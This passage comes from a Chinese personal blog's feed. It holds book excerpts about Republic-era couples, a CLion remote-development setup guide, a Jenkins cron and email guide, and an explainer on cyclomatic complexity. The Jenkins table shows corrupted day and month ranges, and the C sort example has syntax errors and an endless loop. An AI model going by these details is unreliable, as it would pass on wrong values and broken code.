id="3-摘抄"><a class="markdownIt-Anchor" href="#3-摘抄"></a> 3 摘抄</h1><center>一刹那的爱意，可以永恒</center><p><strong>醒来觉得甚是爱你 朱生豪&amp;宋清如</strong></p><blockquote><p>朱生豪在给宋清如的信中写道：“要是我们两人一同在雨声里做梦，那意境是如何不同，或者一同在雨声里失眠，那也是何等有味。”</p><hr><p>我是宋清如至上主义者。</p><hr><p>要是世上只有我们两个人多么好，我一定要把你欺负得哭不出来。</p><hr><p>我爱你也许并不为什么理由，虽然可以有理由，例如你聪明，你纯洁，你可爱，你是好人等，但主要的原因大概是你全然适合我的趣味。因此你仍知道我是自私的，故不用感激我。</p></blockquote><p><strong>从今往后，咱们只有死别，再无生离 钱钟书&amp;杨绛</strong></p><blockquote><p>有的时候，人和人的缘分，一面就能注定。</p><hr><p>后来两人再次见面，约在了清华大学工字厅。钱钟书说道：“我没有订婚。”杨绛答：“我也没有男朋友。”</p><p>对话就是这样直白，一旦遇到了自己心动的那个人，不需要太多的言语，从对方的瞳孔里，你会看到光。</p><hr><p>缠绵悱恻好文章，粉恋香凄足断肠。答报情痴无别物，辛酸一把泪千行。</p><p>依穰小妹剧关心，髾瓣多情一往深。别后经时无只字，居然惜墨抵兼金。</p><p>良宵苦被睡相谩，猎猎风声测测寒。如此星辰如此月，与谁指点与谁看。</p><p>困人节气奈何天，泥煞衾函梦不圆。苦雨泼寒宵似水，百虫声里怯孤眠。</p></blockquote><p><strong>我明白你会来，所以我等 沈从文&amp;张兆和</strong></p><blockquote><p>沈从文这个从乡下走出来的男子遇见清秀典雅的张兆和，便爱得一发不可收拾，他按捺不住内心狂热的爱慕。他把爱慕之情化作情书，第一封情书的开头就直白地写道：</p><p>不知道为什么，我突然爱上了你！</p><hr><p>张兆和对于爱的理解是对的，爱是双方的，需要灵魂的契合，爱就是爱，不爱就是不爱。爱不是感动，不是单方面的付出，当爱掺杂了太多的不平等时，这份爱也就不再能给相爱的人带来快乐。</p></blockquote><p><strong>因为懂得，所以慈悲 张爱玲&amp;胡兰成</strong></p><blockquote><p>张爱玲说：“见了他，她变得很低很低，低到尘埃里，但她心里是欢喜的，从尘埃里开出花来。”</p></blockquote><p><strong>明月装饰了你的窗子，你装饰了别人的梦 卞之琳&amp;张充和</strong></p><blockquote><p>那一抹笑，像是一朵莲花，盛开在那清波碧水间，荡起了一圈一圈涟漪，倩影映射在他的瞳孔里，在他明亮细腻的心里，扎下了根。</p><hr><p>这首诗便是《断章》：</p><p>你站在桥上看风景，</p><p>看风景的人在楼上看你。</p><p>明月装饰了你的窗子，</p><p>你装饰了别人的梦。</p><hr><p>张充和无奈地说道：“从来大家都这么问，我说：他没有说请客，我怎么能说不来呢？他从来没有认真跟我表白过，写信说的也只是日常普通的事，只是写得有点啰唆。</p><hr><p>不得不承认，在我们的生命中，有些人哪怕是很多年没见，你早已忘记了她的声音，脑海中模糊了她的容颜，但再次相遇时，那感觉却永远不会变。</p></blockquote><p><strong>你是燕在梁间的呢喃，你是人间的四月天 梁思成&amp;林徽因</strong></p><blockquote><p>中国有句俗话，‘文章是自己的好，老婆是人家的好’。可是对我来说是，老婆是自己的好，文章是老婆的好，我不否认和林徽因在一起有时很累，因为她的思想太活跃，和她在一起必须和她同样的反应敏捷才行，不然就跟不上她。</p></blockquote><p><strong>心里挂念一个人，从此便有一座城 金岳霖&amp;林徽因</strong></p><blockquote><p>金岳霖听闻后不禁恸哭，在林徽因的追悼会上，金岳霖眼泪没停过，并为她送上了一副挽联：</p><p>一身诗意千寻瀑<br>万古人间四月天</p><hr><p>我们能想象，他在想什么，他或许会想起总布胡同的那段时光，那天，他第一次见到林徽因笑靥如花的样子，就像那四月的花，开在了那个初春，扎根在了他的心里；他或许会想起西南联大的艰苦岁月，会想起林徽因的一颦一笑、一步一印，往事一幕一幕在眼前晃过，活着的他又何尝不想去见她？心里挂念一个人，从此便有一座城。</p><hr><p>人生在世，是该相信点什么的。</p><p>相信爱情，相信遇见与离别；相信未来，会有那样一个人，在不远处等着你；相信一切都是最好的安排；相信美好的事即将发生。</p></blockquote><p><strong>风华是一指流沙，苍老是一段年华 徐志摩&amp;陆小曼</strong></p><blockquote><p>这是婚后陆小曼写给王映霞的信里的话，可谓一针见血。这点她没有林徽因明白得早，当年林徽因就知道徐志摩喜欢的自己并不是真实的自己，而是他自己臆想出来的林徽因。</p></blockquote><p><strong>彪悍的婚姻，不需要解释 胡适&amp;江冬秀</strong></p><blockquote><p>…</p></blockquote><p><strong>小白象与小刺猬，他们相拥而爱 鲁迅&amp;许广平</strong></p><blockquote><p>鲁迅说：“我脾气不好。”</p><p>许广平说：“因为你是先生，我多少让你些，如果是年龄相仿的对手，我不会这样的。”</p></blockquote><p><strong>你许我岁月静好，我还你现世安稳 巴金&amp;萧珊</strong></p><blockquote><p>一生选一人，择一城，生同眠，死同穴，生生世世都要在一起。巴金与萧珊二十多年相濡以沫，两个人在一起，朝着相同的方向努力，相互扶持，这就是最好的爱情。</p></blockquote><p><strong>陪伴是最长情的爱恋，相守是最美好的婚姻 林语堂&amp;廖翠凤</strong></p><blockquote><p>结婚的时候，林语堂做了一件奇事，他把结婚证书一把火烧掉了。</p><p>他说了这样一句话：“把婚书烧了吧，因为婚书只是离婚时才用得着。”</p><p>张爱玲说：“也许每一个男子全都有过这样的两个女人，至少两个，娶了红玫瑰，久而久之，红的变了墙上的一抹蚊子血，白的还是床前明月光，娶了白玫瑰，白的便是衣服上沾的一粒饭粘子，红的却是心口上一颗朱砂痣。</p><hr><p>廖翠凤的一生是甜蜜的、快乐的。人生中最幸福的事就是和同床共枕的那个人一起嘻嘻闹闹，一起看着彼此鬓角渐白、牙齿渐松，然后相对掩嘴偷笑，彼此相依，共度一生。</p></blockquote><p><strong>爱情和婚姻，就该是这般模样 梁实秋&amp;程季淑</strong></p><blockquote><p>程季淑去世后，梁实秋说：“我像一棵树，突然一声霹雳，电火殛毁了半劈的树干，还剩下半株，有枝有叶，还活着，但是生意尽矣。两个人手拉着手的走下山，一个突然倒下去，另一个只好踉踉跄跄地独自继续他的旅程！</p><hr><p>娶妻如此，夫复何求。<br>平生伴侣，亦友亦妻。</p></blockquote><p><strong>他们的爱情，如荷塘清风般淡雅 朱自清&amp;陈竹隐</strong></p><blockquote><p>一九三一年六月十二日，朱自清在情书中写道：“隐，一见你的眼睛，我便清醒起来，我更喜欢看你那晕红的双腮，黄昏时的霞彩似的，谢谢你给我力量。</p><hr><p>原来，生活可以美好，只是过去忘了去寻找。</p></blockquote><p><strong>君对我情断义绝，我偏长出倔强花朵 徐志摩&amp;张幼仪</strong></p><blockquote><p>张幼仪其实长得不差，她自己也说： 我身材不错，还长着一双大眼睛，也是被人夸大的。</p></blockquote><p><strong>生同眠，死同穴，生生世世都要在一起 吴文藻&amp;冰心</strong></p><blockquote><p>冰心：“爱在右，同情在左，走在生命路的两旁，随时撒种，随时开花，将这一径长途，点缀得香花弥漫，使穿枝拂叶的行人，踏着荆棘，不觉得痛苦，有泪可落，也不是悲凉。”</p><hr><p>生同眠，死同穴，天地合，不可与君绝，这大抵就是世间最圆满的爱情了。</p><blockquote><p><strong>此处化用</strong>：汉代<a href="https://so.gushiwen.cn/authorv_2128926194cd.aspx" target="_blank" rel="noopener">佚名</a>的《上邪》</p><p>我欲与君相知，长命无绝衰。<br><strong>山无陵</strong>，江水为竭，冬雷震震，夏雨雪，<strong>天地合，乃敢与君绝！</strong></p></blockquote></blockquote><p><strong>你走，我当你没来过 徐悲鸿&amp;蒋碧微</strong></p><blockquote><p>但蒋碧微拒绝了，并拒绝了六次，无论这个男人在她面前表现得多么悔恨。蒋碧微对徐悲鸿说：“你来，我相信你不会走；你走，我当你没来过。”</p></blockquote><p><strong>在你的生命中，我将孤独地老去 鲁迅&amp;朱安</strong></p><blockquote><p>这是母亲给我的一件礼物，我只能好好地供养她，爱情是我所不知道的。</p><hr><p>朱安明白自己这一生的命运，明白她追随鲁迅一辈子，与他也只能是两条平行线，此生没有相交的可能。她终其一生，都不会是那个与鲁迅温馨相伴的女子。</p><hr><p>朱安的一生，是悲剧的一生，如她自己所说：鲁迅与她不好，她想好好地服侍他，一切顺着他，将来总会好的。</p><p>然而一切没有变好，她与鲁迅越走越远，她就这样在岁月中蹉跎了自己的一生。就像那只蜗牛，一点一点地往上爬，她相信总有一天能爬到墙顶，走进鲁迅的心里，但鲁迅终究不是胡适，朱安也不是江冬秀，她拼尽余生的力气终究也没能成为鲁迅心口上的一颗朱砂痣。</p></blockquote><p><strong>最好的爱情，便是我懂你 张伯驹&amp;潘素</strong></p><blockquote><p>…</p></blockquote><p><strong>微风吹动了我的头发，教我如何不想她 赵元任&amp;杨步伟</strong></p><blockquote><p>…</p></blockquote><h1 id="4-自评"><a class="markdownIt-Anchor" href="#4-自评"></a> 4 自评</h1><p>大四上学期一段时间特别喜欢看欧丽娟关于爱情的视频，其中她推荐了这本书《世事如书，我只爱你这一句》。</p><p>向来欣赏民国才子佳人，但是将其冠以<code>择一人终老，携一人白首</code>的刻板印象，未免有些不公平，对此我有心理准备，于是安静地期待地翻开了这本书。</p><hr><p>（待补充）</p><hr><p>我明白你会来，所以我等。等到最好的我，去遇到更好的你。</p><h1 id="5-他评"><a class="markdownIt-Anchor" href="#5-他评"></a> 5 他评</h1><p>xxx</p><h1 id="6-拓展"><a class="markdownIt-Anchor" href="#6-拓展"></a> 6 拓展</h1><p>是否被拍成影视作品？（无）</p>]]></content>
      
      
      <categories>
          
          <category> 阅读 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 书评 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clion项目配置教程</title>
      <link href="/2022/04/17/Clion%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/"/>
      <url>/2022/04/17/Clion%E9%A1%B9%E7%9B%AE%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="1-下载clion申请license"><a class="markdownIt-Anchor" href="#1-下载clion申请license"></a> 1 下载clion，申请license</h1><ol><li>在clion官网下载安装包（在华为实习时是在IT工具库下载的）；</li><li>申请license，学生邮箱免费使用（公司里面需要审批申请license）；</li></ol><h1 id="2-第一次打开clion前修改缓存位置"><a class="markdownIt-Anchor" href="#2-第一次打开clion前修改缓存位置"></a> 2 第一次打开clion前修改缓存位置</h1><ol><li><p>打开下载目录<code>bin</code>文件夹下<code>idea.properties</code>文件；</p></li><li><p>放开如下注释，并修改<code>idea.config.path</code>和<code>idea.system.path</code>的取值（事先创建这两个目录）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">idea.config.path=目录1</span><br><span class="line">idea.system.path=目录2</span><br><span class="line">idea.plugins.path=$&#123;idea.config.path&#125;/plugins</span><br><span class="line">idea.log.path=$&#123;idea.system.path&#125;/log</span><br></pre></td></tr></table></figure></li></ol><p>这一步是为了避免C盘存放JetBrains的工程缓存内容而被过度占用。</p><p>如果clion已经打开了，也可以修改此配置，只不过可能要重新配置一下clion的初始化步骤。</p><h1 id="3-下载01_rb代码用clion打开"><a class="markdownIt-Anchor" href="#3-下载01_rb代码用clion打开"></a> 3 下载01_RB代码，用clion打开</h1><ol><li>打开部门主仓库；</li><li>Fork自己的仓库；</li><li>安装git并配置，然后将自己的仓库拉到本地。</li></ol><h1 id="4-手动代理设置"><a class="markdownIt-Anchor" href="#4-手动代理设置"></a> 4 手动代理设置</h1><ol><li>点击<code>文件(File)</code>，选择<code>设置(setting)</code>，选择<code>外观和行为——系统设置——HTTP代理</code></li><li>进行配置：<ul><li>主机名：<code>proxy.huawei.com</code></li><li>端口：<code>8080</code></li><li>不为以下项使用代理：<code>127.0.0.1, 10.*.100.*, *.huawei.com</code></li></ul></li></ol><img src="https://s2.loli.net/2022/04/17/LdPivWetjscnFD9.png" width="800" height="400" alt="图片名称" align="center" id="1"><h1 id="5-安装插件"><a class="markdownIt-Anchor" href="#5-安装插件"></a> 5 安装插件</h1><ol><li>打开clion，点击<code>文件(File)</code>，选择<code>设置(settings)</code>，选择<code>插件(plugins)</code>；</li><li>安装以下插件：Chinese，（JetBrains Foundation，Huawei Jetbrains Marketplace，codecheck未找到）</li><li>重启IDE生效</li></ol><h1 id="6-配置远程工作模式"><a class="markdownIt-Anchor" href="#6-配置远程工作模式"></a> 6 配置远程工作模式</h1><ol><li><p><strong>配置工具链</strong>：点击<code>文件(File)</code>，选择<code>设置(setting)</code>，选择<code>构建、执行、部署——工具链</code>，添加远程主机，配置远程主机信息。凭据需要点击后方齿轮进行配置。Make，C编译器，C++编译器会自动检测，不需要配置。</p><img src="https://s2.loli.net/2022/04/17/1u7gXWixpfLIYHT.png" width="1000" height="500" alt="图片名称" align="center" id="2"></li><li><p><strong>配置CMake</strong>：</p><ul><li>CMake 选项：<code>-DCMAKE_TOOLCHAIN_FILE=../cmake/scripts/gcc_ut_toolchain.cmake ..</code></li><li>构建目录：<code>cmake-build-debug</code>（需要与自己项目中的目录对应）</li><li>构建选项：<code>-- -j 32</code>（多线程）</li><li>环境：<code>CHG_HOME=xxx;LD_LIBRARY_PATH=xxx</code>（需要和自己项目中的目录对应）</li></ul></li><li><p><strong>配置部署</strong>：点击<code>文件</code>，选择<code>设置</code>，选择<code>部署</code>，点击<code>映射</code>，配置部署路径：<code>/usr1/dragon/01_RB</code>（改成自己的，远程主机上的项目根目录）</p><img src="https://s2.loli.net/2022/04/17/2h1tioH4Q5snyrp.png" width="1000" height="300" alt="图片名称" align="center" id="3"></li><li><p><strong>Debug配置</strong>：登陆到远程主机，将环境变量添加到<code>~/.bashrc</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> CHG_HOME=xxx</span><br><span class="line"><span class="built_in">export</span> LD_LIBRARY_PATH=xxx</span><br><span class="line"><span class="built_in">export</span> TZ=BEST-8</span><br><span class="line"><span class="built_in">export</span> BILLING_HOME=xxx</span><br></pre></td></tr></table></figure></li></ol><h1 id="7-clang-format的使用"><a class="markdownIt-Anchor" href="#7-clang-format的使用"></a> 7 clang-format的使用</h1><ol><li>将<code>.clang-fromat</code>文件放到要打开项目的根目录下，CLion会自动启用ClangFormat并应用设置；</li><li>在<code>文件——设置——编辑器——代码样式</code>勾选启用<code>ClangFormat</code>，然后状态栏会显示<code>ClangFormat</code>；</li><li>使用快捷键<code>Ctrl+Alt+L</code>，可以重新格式化选定代码，没有选定代码时，会格式化整个文件；</li></ol><h1 id="8-ut的配置"><a class="markdownIt-Anchor" href="#8-ut的配置"></a> 8 UT的配置</h1><ol><li>选择<code>编辑配置--UTTest</code>，进行配置并应用：<ul><li>程序参数：<code>nolog --gtest_filter=&quot;xxx&quot;</code>（后面的–gtest_filter=&quot;…&quot;是根据CLion输出信息填写的，过滤掉无关报错）</li><li>环境变量：<code>CHG_HOME=xxx;LD_LIBRARY_PATH=xxx;TZ=BEST-8;BILLING_HOME=xxx</code></li></ul></li><li>单个执行配置，在当前界面点击<code>编辑配置模板</code>，选择<code>Google Test</code>，进行配置并应用：<ul><li>目标：选择<code>UTTest</code></li><li>程序参数：不用填</li><li>工作目录：<code>\usr1\dragon\01_RB\test\rating_charging\cppcode\90_uttest\bin</code> （需要改成自己的）</li><li>环境变量：<code>CHG_HOME=xxx;LD_LIBRARY_PATH=xxx;TZ=BEST-8;BILLING_HOME=xxx</code>（需要改成自己的）</li></ul></li></ol><h1 id="9-编译"><a class="markdownIt-Anchor" href="#9-编译"></a> 9 编译</h1><p>点击运行按钮，如果出现下面的报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c++: internal compiler error</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>编译内部错误有可能是后台内存不足导致的，点击左边的构建按钮，可能会编译成功。</p><p>如果后面再出现这种错误，就把<code>构建选项</code>中的数字改小一点：<code>-- -j 32</code></p>]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Jenkins配置定时发送邮件功能</title>
      <link href="/2022/04/16/Jenkins%E9%85%8D%E7%BD%AE%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E5%8A%9F%E8%83%BD/"/>
      <url>/2022/04/16/Jenkins%E9%85%8D%E7%BD%AE%E5%AE%9A%E6%97%B6%E5%8F%91%E9%80%81%E9%82%AE%E4%BB%B6%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="0-安装jenkins"><a class="markdownIt-Anchor" href="#0-安装jenkins"></a> 0 安装Jenkins</h1><p><a href="https://cloud.tencent.com/developer/article/1666282" target="_blank" rel="noopener">如何在 Ubuntu 20.04 上安装 Jenkins</a></p><p>Jenkins 是最流行的，开源的，基于 Java 的自动化服务器，它允许你很容易地设置一个<a href="https://cloud.tencent.com/product/coding-ci?from=10680" target="_blank" rel="noopener">持续集成</a>和持续发布的管道。</p><p>持续集成 (CI)是一个 DevOps 实践。当团队成员正常提交代码到版本控制仓库时，会运行自动化构建和测试。持续发布（CD）是一系列实践，当代码修改后，自动构建，测试，并且发布到生产环境中。</p><p>Jenkins 可以被作为一个独立应用安装，作为 Java servlet 容器（例如 Apache Tomcat）中的一个 servlet 安装，或者 以 Docker 容器的形式运行。</p><p>独立服务的形式安装 Jenkins：</p><h1 id="1-发送邮件"><a class="markdownIt-Anchor" href="#1-发送邮件"></a> 1 发送邮件</h1><h2 id="11-设置参数"><a class="markdownIt-Anchor" href="#11-设置参数"></a> 1.1 设置参数</h2><p>为了使得下面脚本成功执行，需要设置以下参数：</p><ul><li><strong>Receiver</strong> 邮件接收邮箱</li><li><strong>Copyer</strong> 邮件抄送邮箱</li><li><strong>Subject</strong> 邮件主题</li><li><strong>ReportLink</strong> 邮件链接</li><li><strong>ReportFile</strong> 邮件报告文件（本次测试中未使用）</li></ul><p>样例如下：</p><img src="https://s2.loli.net/2022/04/17/jkUSXfEdhbH4C6M.png" width="700" height="500" alt="图片名称" align="center" id="162"><h2 id="12-运行脚本"><a class="markdownIt-Anchor" href="#12-运行脚本"></a> 1.2 运行脚本</h2><p>该脚本在<code>01_RB</code>工程中已存在，根据需求修改即可。路径：<code>test/install/AutoInstallRB/icp/send_report_email.py</code></p><p>运行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 send_report_email.py -u <span class="string">"用户ID/codehub密码的Base64编码"</span> <span class="string">"本人邮箱"</span> <span class="string">"<span class="variable">$Receiver</span>"</span> <span class="string">"<span class="variable">$Copyer</span>"</span> <span class="string">"<span class="variable">$ReportFile</span>"</span> <span class="string">"<span class="variable">$Subject</span>"</span> <span class="string">"<span class="variable">$ReportLink</span>"</span></span><br></pre></td></tr></table></figure><p><code>send_report_email.py</code>脚本路径目录：<code>E:\04 Worker_work\01 实习\202109-华为C++后端实习\hw-addlcov\CBS-SW\01_RB\scripts</code></p><h1 id="2-jenkins-定时任务时间设置"><a class="markdownIt-Anchor" href="#2-jenkins-定时任务时间设置"></a> 2 Jenkins 定时任务时间设置</h1><h2 id="21-定时任务的时间格式"><a class="markdownIt-Anchor" href="#21-定时任务的时间格式"></a> 2.1 定时任务的时间格式</h2><p>定时任务的时间格式设定遵循的是cron的语法规则。具体的格式划分为5个字段：分别为 分钟、小时、日、月、星期、通过tab或者空格进行隔离区分</p><table><thead><tr><th style="text-align:center">字段</th><th style="text-align:center">*</th><th style="text-align:center">*</th><th style="text-align:center">*</th><th style="text-align:center">*</th><th style="text-align:center">*</th></tr></thead><tbody><tr><td style="text-align:center">含义</td><td style="text-align:center">分钟</td><td style="text-align:center">小时</td><td style="text-align:center">日期</td><td style="text-align:center">月份</td><td style="text-align:center">星期</td></tr><tr><td style="text-align:center">取值范围</td><td style="text-align:center">0-59</td><td style="text-align:center">0-23</td><td style="text-align:center">1月30日</td><td style="text-align:center">1月11日</td><td style="text-align:center">0-7</td></tr><tr><td style="text-align:center"><strong>实例</strong></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">每隔15分钟执行一次</td><td style="text-align:center">H/15</td><td style="text-align:center">*</td><td style="text-align:center">*</td><td style="text-align:center">*</td><td style="text-align:center">*</td></tr><tr><td style="text-align:center">每隔2小时执行一次</td><td style="text-align:center">H</td><td style="text-align:center">H/2</td><td style="text-align:center">*</td><td style="text-align:center">*</td><td style="text-align:center">*</td></tr><tr><td style="text-align:center">每隔3天执行一次</td><td style="text-align:center">H</td><td style="text-align:center">H</td><td style="text-align:center">H/3</td><td style="text-align:center">*</td><td style="text-align:center">*</td></tr><tr><td style="text-align:center">每隔3天执行一次（每月1-15号）</td><td style="text-align:center">H</td><td style="text-align:center">H</td><td style="text-align:center">1-15/3</td><td style="text-align:center">*</td><td style="text-align:center">*</td></tr><tr><td style="text-align:center">每隔1、3、5执行一次</td><td style="text-align:center">H</td><td style="text-align:center">H</td><td style="text-align:center">*</td><td style="text-align:center">*</td><td style="text-align:center">1,3,5</td></tr><tr><td style="text-align:center"><strong>规则</strong></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">指定时间范围</td><td style="text-align:center">a-b</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">指定时间间隔</td><td style="text-align:center">/</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr><tr><td style="text-align:center">指定变量取值</td><td style="text-align:center">a,b,c</td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td><td style="text-align:center"></td></tr></tbody></table><p>参数含义：</p><ol><li>*代表 匹配范围内所有值</li><li>M-N 匹配M~N范围内所有值</li><li>M-N/X 或者 */X 在指定M~N范围内或整个有效区间内每隔X构建一次</li><li>A,B,…,Z 匹配多个值</li></ol><h2 id="22-一些常用的时间规则"><a class="markdownIt-Anchor" href="#22-一些常用的时间规则"></a> 2.2 一些常用的时间规则</h2><table><thead><tr><th style="text-align:center">时间规则</th><th style="text-align:center">规则内容</th></tr></thead><tbody><tr><td style="text-align:center">每天上午9点定时构建</td><td style="text-align:center">H 9 * * *</td></tr><tr><td style="text-align:center">每天上午11点和下午6点定时构建</td><td style="text-align:center">H 11,18 * * *</td></tr><tr><td style="text-align:center">每个小时的前30分钟内，每10分钟构建一次</td><td style="text-align:center">H(0-29)/10 * * * *</td></tr><tr><td style="text-align:center">周一到周五，9-16点，每2小时的第45分钟构建一次</td><td style="text-align:center">45 9-16/2 * * 1-5</td></tr><tr><td style="text-align:center">每个工作日从早上9点到下午5点这段时间内每间隔2小时之间的某刻。(或许在上午10:38, 下午12:38, 下午2:38 , 下午4:38)</td><td style="text-align:center">H H(9-16)/2 * * 1-5</td></tr><tr><td style="text-align:center">每月（除了12月）从1号到15号这段时间内某刻</td><td style="text-align:center">H H 1,15 1-11 *</td></tr></tbody></table><h2 id="23-样例"><a class="markdownIt-Anchor" href="#23-样例"></a> 2.3 样例</h2><img src="https://s2.loli.net/2022/04/17/YfT4HG5mLbhXBPF.png" width="800" height="500" alt="图片名称" align="center" id="163">]]></content>
      
      
      <categories>
          
          <category> 环境与工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>圈复杂度</title>
      <link href="/2022/04/15/%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6/"/>
      <url>/2022/04/15/%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p><strong>转载</strong>：<a href="http://kaelzhang81.github.io/2017/06/18/%E8%AF%A6%E8%A7%A3%E5%9C%88%E5%A4%8D%E6%9D%82%E5%BA%A6/#" target="_blank" rel="noopener">详解圈复杂度</a></p></blockquote><h1 id="1-圈复杂度概念"><a class="markdownIt-Anchor" href="#1-圈复杂度概念"></a> 1 圈复杂度概念</h1><p>圈复杂度（Cyclomatic complexity，简写CC）也称为条件复杂度，是一种代码复杂度的衡量标准。由托马斯·J·麦凯布（Thomas J. McCabe, Sr.）于1976年提出，用来表示程序的复杂度，其符号为VG或是M。它可以用来衡量一个模块判定结构的复杂程度，数量上表现为独立现行路径条数，也可理解为覆盖所有的可能情况最少使用的测试用例数。圈复杂度大说明程序代码的判断逻辑复杂，可能质量低且难于测试和维护。程序的可能错误和高的圈复杂度有着很大关系。</p><h1 id="2-圈复杂度计算方法"><a class="markdownIt-Anchor" href="#2-圈复杂度计算方法"></a> 2 圈复杂度计算方法</h1><h2 id="21-点边计算法"><a class="markdownIt-Anchor" href="#21-点边计算法"></a> 2.1 点边计算法</h2><img src="https://s2.loli.net/2022/04/16/BrNW3etERXLkhgD.jpg" width="400" height="300" alt="图片名称" align="center" id="154"><p>圈复杂度的计算方法很简单，计算公式为：</p><blockquote><p>V(G) = E - N + 2</p></blockquote><p>其中，e表示控制流图中边的数量，n表示控制流图中节点的数量。</p><p>几个节点通过边连接。下面是典型的控制流程，如if-else，While，until和正常的流程顺序：</p><img src="https://s2.loli.net/2022/04/16/g4uVjXO2MIixykz.png" width="400" height="300" alt="图片名称" align="center" id="155"><h2 id="22-节点判定法"><a class="markdownIt-Anchor" href="#22-节点判定法"></a> 2.2 节点判定法</h2><p>其实，圈复杂度的计算还有更直观的方法，因为圈复杂度所反映的是“判定条件”的数量，所以圈复杂度实际上就是等于判定节点的数量再加上1，也即控制流图的区域数，对应的计算公式为：</p><blockquote><p>V (G) = P + 1</p></blockquote><p>其中P为判定节点数，判定节点举例：</p><ol><li>if语句</li><li>while语句</li><li>for语句</li><li>case语句</li><li>catch语句</li><li>and和or布尔操作</li><li>?:三元运算符</li></ol><p>对于多分支的CASE结构或IF-ELSEIF-ELSE结构，统计判定节点的个数时需要特别注意一点，要求必须统计全部实际的判定节点数，也即每个ELSEIF语句，以及每个CASE语句，都应该算为一个判定节点。</p><p>判定节点在模块的控制流图中很容易被识别出来，所以，针对程序的控制流图计算圈复杂度V(G)时，一般采用点边计算法，也即V(G)=e-n+2；而针对模块的控制流图时，可以直接使用统计判定节点数，这样更为简单。</p><h1 id="3-圈复杂度计算练习"><a class="markdownIt-Anchor" href="#3-圈复杂度计算练习"></a> 3 圈复杂度计算练习</h1><h2 id="31-练习1"><a class="markdownIt-Anchor" href="#31-练习1"></a> 3.1 练习1：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sort</span><span class="params">(<span class="keyword">int</span> * A)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> n=<span class="number">4</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i &lt; n<span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        j = i +<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span>(j &lt; n)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (A[i] &lt; A[j])</span><br><span class="line">                 swap(A[i], A[j]);</span><br><span class="line">        &#125;</span><br><span class="line">        i = i + <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用点边计算法绘出控制流图：</p><img src="https://s2.loli.net/2022/04/16/12dtWP4XsOMEHjU.png" width="400" height="300" alt="图片名称" align="center" id="156"><p>其圈复杂度为：V(G) = 9 - 7 + 2 = 4</p><h2 id="32-练习2"><a class="markdownIt-Anchor" href="#32-练习2"></a> 3.2 练习2：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 